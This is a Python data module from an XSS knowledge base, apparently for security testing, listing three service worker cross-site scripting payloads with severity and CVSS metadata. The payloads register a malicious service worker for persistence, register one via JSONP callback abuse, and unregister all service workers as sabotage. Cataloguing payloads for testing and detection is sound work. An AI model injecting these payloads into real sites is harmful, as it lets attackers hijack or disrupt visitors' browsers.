#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Service Worker XSS Payloads
"""

from ..models import PayloadEntry


SERVICE_WORKER_PAYLOADS = {
    "sw_1": PayloadEntry(
        payload="<script>navigator.serviceWorker.register('evil-sw.js')</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Register malicious service worker",
        tags=["service-worker", "register", "persistence"],
        reliability="medium",
    ),
    "sw_2": PayloadEntry(
        payload="<script>navigator.serviceWorker.register('/api/user?callback='+encodeURIComponent('self.addEventListener(\"fetch\",e=>e.respondWith(fetch(e.request)))//'));",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Service worker via JSONP",
        tags=["service-worker", "jsonp", "persistence"],
        reliability="low",
    ),
    "sw_3": PayloadEntry(
        payload="<script>navigator.serviceWorker.getRegistrations().then(r=>r.map(s=>s.unregister()))</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Unregister all service workers (sabotage)",
        tags=["service-worker", "unregister", "sabotage"],
        reliability="high",
    ),
}

SERVICE_WORKER_PAYLOADS_TOTAL = len(SERVICE_WORKER_PAYLOADS)
